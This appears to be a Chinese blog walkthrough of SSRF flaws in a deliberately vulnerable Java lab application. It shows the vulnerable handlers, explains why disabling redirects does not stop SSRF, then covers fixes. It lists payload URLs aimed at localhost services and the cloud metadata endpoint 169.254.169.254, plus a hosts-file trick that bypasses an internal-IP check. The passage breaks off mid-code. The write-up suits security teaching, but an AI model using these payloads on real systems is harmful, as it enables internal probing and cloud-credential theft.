title="3.&#x2F;ssrf&#x2F;openStream"></a>3.&#x2F;ssrf&#x2F;openStream</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/openStream&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">openStream</span><span class="params">(<span class="meta">@RequestParam</span> String url, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">downLoadImgFileName</span> <span class="operator">=</span> WebUtils.getNameWithoutExtension(url) + <span class="string">&quot;.&quot;</span> + WebUtils.getFileExtension(url);</span><br><span class="line">        <span class="comment">// download</span></span><br><span class="line">        response.setHeader(<span class="string">&quot;content-disposition&quot;</span>, <span class="string">&quot;attachment;fileName=&quot;</span> + downLoadImgFileName);</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">        <span class="type">int</span> length;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        inputStream = u.openStream(); <span class="comment">// send request</span></span><br><span class="line">        outputStream = response.getOutputStream();</span><br><span class="line">        <span class="keyword">while</span> ((length = inputStream.read(bytes)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            outputStream.write(bytes, <span class="number">0</span>, length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (inputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (outputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">            outputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过这个路由实现任意文件下载：</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272132329.png" alt="image-20250527213236260" loading="lazy"></p><h4 id="4-ssrf-HttpSyncClients-vuln"><a href="#4-ssrf-HttpSyncClients-vuln" class="headerlink" title="4.&#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln"></a>4.&#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/HttpSyncClients/vuln&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">HttpSyncClients</span><span class="params">(<span class="meta">@RequestParam(&quot;url&quot;)</span> String url)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> HttpUtils.HttpAsyncClients(url);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>我们来看HttpAsyncClients</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">HttpAsyncClients</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    <span class="type">CloseableHttpAsyncClient</span> <span class="variable">httpclient</span> <span class="operator">=</span> HttpAsyncClients.createDefault();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        httpclient.start();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">HttpGet</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(url);</span><br><span class="line">        Future&lt;HttpResponse&gt; future = httpclient.execute(request, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">HttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> future.get(<span class="number">6000</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">        <span class="keyword">return</span> EntityUtils.toString(response.getEntity());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            httpclient.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现没有对url进行检查，所以可以使用ssrf</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272138857.png" alt="image-20250527213854753" loading="lazy"></p><h4 id="5-ssrf-restTemplate-vuln1"><a href="#5-ssrf-restTemplate-vuln1" class="headerlink" title="5.&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1"></a>5.&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/restTemplate/vuln1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">RestTemplateUrlBanRedirects</span><span class="params">(String url)</span>&#123;</span><br><span class="line">    <span class="type">HttpHeaders</span> <span class="variable">headers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpHeaders</span>();</span><br><span class="line">    headers.setContentType(MediaType.APPLICATION_JSON_UTF8);</span><br><span class="line">    <span class="keyword">return</span> httpService.RequestHttpBanRedirects(url, headers);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码使用 <strong>Spring RestTemplate</strong> 来进行 HTTP 请求，并禁止了重定向，但不影响直接访问</p><p>注：为什么需要加个&#x2F;login</p><p>因为<a href="http://60.205.158.87:8080/%E4%BC%9A%E9%BB%98%E8%AE%A4%E8%B7%B3%E8%BD%AC%E5%88%B0/login%EF%BC%8C%E8%80%8C%E4%BB%A3%E7%A0%81%E7%A6%81%E6%AD%A2%E4%BA%86%E9%87%8D%E5%AE%9A%E5%90%91">http://60.205.158.87:8080/会默认跳转到/login，而代码禁止了重定向</a></p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272146502.png" alt="image-20250527214625396" loading="lazy"></p><p>既然已经禁止了重定向（Redirect），为什么 SSRF 仍然可能发生？</p><hr><p>一、什么是 SSRF？</p><p><strong>SSRF（Server-Side Request Forgery）</strong>，即服务器端请求伪造。攻击者控制一个参数，让服务器主动去访问一个由他指定的 URL，从而达到探测内网、打数据库、访问云元数据服务（如 AWS 的 <code>169.254.169.254</code>）等目的。</p><p><strong>核心问题：不是重定向，而是“服务器能不能发出请求”。</strong></p><hr><p>二、禁止重定向 vs SSRF 的区别</p><p>你禁止的是 <strong>HTTP 3xx 重定向</strong>，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户访问 http://example.com =&gt; 返回 302 Location: http://malicious.com/internal</span><br></pre></td></tr></table></figure><p>这时候如果自动跟随重定向，就会去访问 <code>http://malicious.com/internal</code>。禁用重定向只防止了这种 <strong>间接跳转 SSRF</strong>。</p><p>✅ <strong>禁止重定向确实防止了这种“跳转型 SSRF”。</strong></p><hr><p>但是，<strong>普通 SSRF 根本不依赖重定向！</strong></p><p>比如你直接访问这个地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:3306/</span><br><span class="line">http://169.254.169.254/latest/meta-data/</span><br><span class="line">http://localhost:8080/actuator/env</span><br></pre></td></tr></table></figure><p>这些 URL <strong>根本不会返回 3xx 重定向</strong>，它们是直接请求目标服务，获取响应。</p><p>在你当前的代码中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpService.RequestHttpBanRedirects(url, headers);</span><br></pre></td></tr></table></figure><p>如果攻击者传的就是一个直连目标，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1:8080/</span><br></pre></td></tr></table></figure><p>你不管重定向不重定向，<strong>请求都会直接发出去</strong>，SSRF 就发生了。</p><h4 id="6-ssrf-restTemplate-vuln2"><a href="#6-ssrf-restTemplate-vuln2" class="headerlink" title="6.&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2"></a>6.&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/restTemplate/vuln2&quot;)</span></span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">RestTemplateUrl</span><span class="params">(String url)</span>&#123;</span><br><span class="line">     <span class="type">HttpHeaders</span> <span class="variable">headers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpHeaders</span>();</span><br><span class="line">     headers.setContentType(MediaType.APPLICATION_JSON_UTF8);</span><br><span class="line">     <span class="keyword">return</span> httpService.RequestHttp(url, headers);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这串代码没有禁止重定向，我们可以直接SSRF</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505281929552.png" alt="image-20250528192945371" loading="lazy"></p><h4 id="7-ssrf-hutool-vuln"><a href="#7-ssrf-hutool-vuln" class="headerlink" title="7.&#x2F;ssrf&#x2F;hutool&#x2F;vuln"></a>7.&#x2F;ssrf&#x2F;hutool&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/hutool/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hutoolHttp</span><span class="params">(String url)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> HttpUtil.get(url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个库也能ssrf，但禁止了重定向</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505281948518.png" alt="image-20250528194858386" loading="lazy"></p><p>8.&#x2F;ssrf&#x2F;denrebind&#x2F;vuln</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/dnsrebind/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">DnsRebind</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    java.security.Security.setProperty(<span class="string">&quot;networkaddress.cache.negative.ttl&quot;</span> , <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!SecurityUtil.checkSSRFWithoutRedirect(url)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Dangerous url&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> HttpUtil.get(url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>来看checkSSRFWithoutRedirect</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 不能使用白名单的情况下建议使用该方案。前提是禁用重定向并且TTL默认不为0。</span></span><br><span class="line"><span class="comment">    * 存在问题：</span></span><br><span class="line"><span class="comment">    *  1、TTL为0会被绕过</span></span><br><span class="line"><span class="comment">    *  2、使用重定向可绕过</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> url The url that needs to check.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> Safe url returns true. Dangerous url returns false.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkSSRFWithoutRedirect</span><span class="params">(String url)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(url == <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> !SSRFChecker.isInternalIpByUrl(url);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>来看isInternalIpByUrl函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isInternalIpByUrl</span><span class="params">(String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> url2host(url);</span><br><span class="line">        <span class="keyword">if</span> (host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 异常URL当成内网IP等非法URL处理</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> host2ip(host);</span><br><span class="line">        <span class="keyword">if</span> (ip.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 如果域名转换为IP异常，则认为是非法URL</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> isInternalIp(ip);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>添加了IP检查，修改一下dns解析即可绕过，方法如下：</p><p>给本地的hosts文件添加一条解析记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.43 www.baidu.com</span><br></pre></td></tr></table></figure><h4 id="8-ssrf-dnsrebind-vuln"><a href="#8-ssrf-dnsrebind-vuln" class="headerlink" title="8.&#x2F;ssrf&#x2F;dnsrebind&#x2F;vuln"></a>8.&#x2F;ssrf&#x2F;dnsrebind&#x2F;vuln</h4><p>漏洞代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/dnsrebind/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">DnsRebind</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    java.security.Security.setProperty(<span class="string">&quot;networkaddress.cache.negative.ttl&quot;</span> , <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!SecurityUtil.checkSSRFWithoutRedirect(url)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Dangerous url&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> HttpUtil.get(url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们来看checkSSRFWithoutRedirect函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 不能使用白名单的情况下建议使用该方案。前提是禁用重定向并且TTL默认不为0。</span></span><br><span class="line"><span class="comment">    * 存在问题：</span></span><br><span class="line"><span class="comment">    *  1、TTL为0会被绕过</span></span><br><span class="line"><span class="comment">    *  2、使用重定向可绕过</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> url The url that needs to check.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> Safe url returns true. Dangerous url returns false.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkSSRFWithoutRedirect</span><span class="params">(String url)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(url == <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> !SSRFChecker.isInternalIpByUrl(url);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>isInternalIpByUrl</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public static boolean isInternalIpByUrl(String url) &#123;</span><br><span class="line"></span><br><span class="line">        String host = url2host(url);</span><br><span class="line">        if (host.equals(&quot;&quot;)) &#123;</span><br><span class="line">            return true; // 异常URL当成内网IP等非法URL处理</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String ip = host2ip(host);</span><br><span class="line">        if (ip.equals(&quot;&quot;)) &#123;</span><br><span class="line">            return true; // 如果域名转换为IP异常，则认为是非法URL</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return isInternalIp(ip);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>添加了IP检查，修改一下dns解析即可绕过，方法如下：</p><p>给本地的hosts文件添加一条解析记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.43 www.baidu.com</span><br></pre></td></tr></table></figure><p>然后就可以实现ssrf</p><h4 id="ssrf的修复与防护"><a href="#ssrf的修复与防护" class="headerlink" title="ssrf的修复与防护"></a>ssrf的修复与防护</h4><p>（1）限制协议使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/urlConnection/sec&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">URLConnectionSec</span><span class="params">(String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decline not http/https protocol</span></span><br><span class="line">    <span class="keyword">if</span> (!SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;[-] SSRF check failed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        SecurityUtil.startSSRFHook();</span><br><span class="line">        <span class="keyword">return</span> HttpUtils.URLConnection(url);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SSRFException | IOException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        SecurityUtil.stopSSRFHook();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>isHttp函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isHttp</span><span class="params">(String url)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> url.startsWith(<span class="string">&quot;http://&quot;</span>) || url.startsWith(<span class="string">&quot;https://&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>会检查 <code>url</code> 是否是 <code>http://</code> 或 <code>https://</code> 协议，如果不是则直接返回 <code>&quot;[-] SSRF check failed&quot;</code>，防止 <code>file://</code>、<code>ftp://</code>、<code>gopher://</code> 等协议的 SSRF 利用</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507240850408.png" alt="image-20250724085008108" loading="lazy"></p><p>（2）限制文件访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/ImageIO/sec&quot;)</span></span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">ImageIO</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> &#123;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         SecurityUtil.startSSRFHook();</span><br><span class="line">         HttpUtils.imageIO(url);</span><br><span class="line">     &#125; <span class="keyword">catch</span> (SSRFException | IOException e) &#123;</span><br><span class="line">         <span class="keyword">return</span> e.getMessage();</span><br><span class="line">     &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         SecurityUtil.stopSSRFHook();</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;ImageIO ssrf test&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>imageIO</code>函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">imageIO</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">            ImageIO.read(u); <span class="comment">// send request</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            logger.error(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>（3）http请求检查</p><p>方法1：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/okhttp/sec&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">okhttp</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        SecurityUtil.startSSRFHook();</span><br><span class="line">        <span class="keyword">return</span> HttpUtils.okhttp(url);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SSRFException | IOException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        SecurityUtil.stopSSRFHook();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>okhttp</code>函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">okhttp</span><span class="params">(String url)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>();</span><br><span class="line">    com.squareup.okhttp.<span class="type">Request</span> <span class="variable">ok_http</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.squareup.okhttp.Request.Builder().url(url).build();</span><br><span class="line">    <span class="keyword">return</span> client.newCall(ok_http).execute().body().string();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>方法2：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/httpclient/sec&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">HttpClient</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           SecurityUtil.startSSRFHook();</span><br><span class="line">           <span class="keyword">return</span> HttpUtils.httpClient(url);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (SSRFException | IOException e) &#123;</span><br><span class="line">           <span class="keyword">return</span> e.getMessage();</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           SecurityUtil.stopSSRFHook();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>httpClient</code>函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 